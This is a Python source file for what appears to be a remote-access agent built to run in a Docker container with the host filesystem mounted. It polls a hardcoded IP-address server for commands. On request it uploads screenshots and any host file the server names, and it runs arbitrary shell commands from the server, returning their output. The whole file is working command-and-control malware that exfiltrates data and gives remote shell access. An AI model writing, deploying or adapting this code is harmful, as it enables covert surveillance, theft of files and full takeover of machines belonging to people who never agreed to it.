import os
import time
import subprocess
import tempfile
import requests
import uuid
import socket

SERVER = os.environ.get("SERVER_URL", "http://31.130.130.186:5000")
POLL = int(os.environ.get("POLL_INTERVAL", "2"))
HOST_MOUNT = "/host"
ID_FILE = "/app/.device_id"

def get_or_create_device_id():
    if os.path.exists(ID_FILE):
        with open(ID_FILE, "r") as f:
            return f.read().strip()
    new_id = uuid.uuid4().hex[:8]
    with open(ID_FILE, "w") as f:
        f.write(new_id)
    return new_id

def get_host_ip():
    # Пробуем получить IP default gateway (хост изнутри Docker)
    try:
        import subprocess as sp
        out = sp.run(["ip", "route"], capture_output=True, text=True, timeout=2)
        for line in out.stdout.splitlines():
            if line.startswith("default"):
                parts = line.split()
                if "via" in parts:
                    return parts[parts.index("via") + 1]
    except Exception:
        pass
    # fallback — hostname
    try:
        return socket.gethostbyname(socket.gethostname())
    except Exception:
        return "unknown"

def take_screenshot(path):
    tools = [
        ["scrot", "-z", path],
    ]
    for tool in tools:
        try:
            r = subprocess.run(tool, capture_output=True, text=True, timeout=15)
            if r.returncode == 0 and os.path.exists(path) and os.path.getsize(path) > 0:
                print(f"[agent] screenshot ok via {tool[0]}")
                return True
        except Exception as e:
            print(f"[agent] {tool[0]} failed: {e}")
    return False

def send_result(cmd_id, text):
    payload = {"id": DEVICE_ID, "cmd_id": cmd_id, "result": text}
    try:
        requests.post(f"{SERVER}/api/command", json=payload, timeout=10)
    except Exception as e:
        print(f"[agent] send_result error: {e}")

def main():
    global DEVICE_ID
    DEVICE_ID = get_or_create_device_id()
    host_ip = get_host_ip()
    print(f"[agent] started, server={SERVER}, device={DEVICE_ID}, host_ip={host_ip}")
    while True:
        try:
            r = requests.get(f"{SERVER}/api/command", params={"id": DEVICE_ID}, timeout=10)
            r.raise_for_status()
            data = r.json()
        except Exception as e:
            print(f"[agent] poll error: {e}")
            time.sleep(POLL)
            continue

        if not data or not isinstance(data, dict):
            time.sleep(POLL)
            continue

        action = data.get("action")
        if not action:
            time.sleep(POLL)
            continue

        cmd_id = data.get("cmd_id") or data.get("id")
        args = data.get("args", "")
        print(f"[agent] cmd_id={cmd_id} action={action} args={args}")

        if action == "screen":
            tmp = tempfile.NamedTemporaryFile(suffix=".png", delete=False)
            tmp.close()
            try:
                ok = take_screenshot(tmp.name)
                if ok:
                    with open(tmp.name, "rb") as f:
                        requests.post(f"{SERVER}/api/screen", files={"file": f}, data={"id": DEVICE_ID}, timeout=30)
                    print(f"[agent] screenshot uploaded")
                else:
                    send_result(cmd_id, "ERROR: no screenshot tool available or X11 not accessible")
            finally:
                try:
                    os.unlink(tmp.name)
                except Exception:
                    pass

        elif action == "file":
            filepath = args.strip() if args else ""
            if not filepath:
                send_result(cmd_id, "ERROR: no file path provided")
            else:
                if not os.path.isabs(filepath):
                    filepath = os.path.join(HOST_MOUNT, filepath)
                else:
                    filepath = os.path.join(HOST_MOUNT, filepath.lstrip("/"))
                if os.path.exists(filepath) and os.path.isfile(filepath):
                    with open(filepath, "rb") as f:
                        requests.post(f"{SERVER}/api/file", files={"file": f}, data={"id": DEVICE_ID}, timeout=30)
                    print(f"[agent] file uploaded from {filepath}")
                else:
                    send_result(cmd_id, f"ERROR: file not found: {filepath}")

        else:
            command = action
            if args:
                command += " " + args
            try:
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60, cwd=HOST_MOUNT)
                output = result.stdout
                if result.stderr:
                    output += "\nSTDERR:\n" + result.stderr
                send_result(cmd_id, output)
                print(f"[agent] result uploaded")
            except Exception as e:
                send_result(cmd_id, f"ERROR: {e}")

        time.sleep(POLL)

if __name__ == "__main__":
    main()
